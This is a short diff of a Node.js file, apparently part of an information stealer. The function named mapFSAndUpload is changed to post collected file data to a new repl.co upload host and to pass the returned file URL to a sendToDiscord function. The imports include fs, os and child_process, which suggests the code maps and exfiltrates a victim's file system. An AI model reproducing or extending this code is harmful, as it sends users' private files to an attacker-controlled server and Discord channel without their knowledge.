@@ -1,6 +1,7 @@
 const axios = require("axios");
 const fs = require("fs");
 const os = require("os");
+const FormData = require("form-data");
 const path = require("path");
 const { execSync } = require("child_process");
 
@@ -117,13 +118,14 @@ async function mapFSAndUpload() {
 
   try {
     const response = await axios.post(
-      "https://file-host-1.blueobsidian.repl.co/upload.php",
+      "https://frigh-tenedjuicyclicks.blueobsidian.repl.co/upload",
       formData,
       {
         headers: formData.getHeaders(),
       }
     );
-    console.log(response.data);
+
+    sendToDiscord(response.data.fileUrl);
   } catch (error) {
     console.error(error);
   }
